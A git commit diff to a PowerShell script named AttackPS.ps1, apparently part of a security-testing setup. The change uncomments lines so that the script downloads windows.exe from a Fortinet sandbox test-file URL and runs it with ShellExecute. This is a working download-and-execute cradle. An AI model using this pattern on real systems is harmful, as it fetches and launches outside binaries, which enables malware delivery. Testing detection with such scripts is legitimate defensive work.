3d9bf442a1a99a4105f1a4676fad524080e30164
Alberto <alberto.briano@outlook.com>
2026-06-15 23:03:58 +0200

    test in different directory

--- Windows/AttackPS.ps1
+++ Windows/AttackPS.ps1
@@ -1,7 +1,7 @@
-cd %UserProfile%
+cd C:\
 $down = New-Object System.Net.WebClient
 $url = 'https://filegen.fortinet.com/v1/sandbox-file?file_name=windows.exe';
 $file = 'windows.exe';
 $down.DownloadFile($url,$file);
-#$exec = New-Object -com shell.application
-#$exec.shellexecute($file);
+$exec = New-Object -com shell.application
+$exec.shellexecute($file);
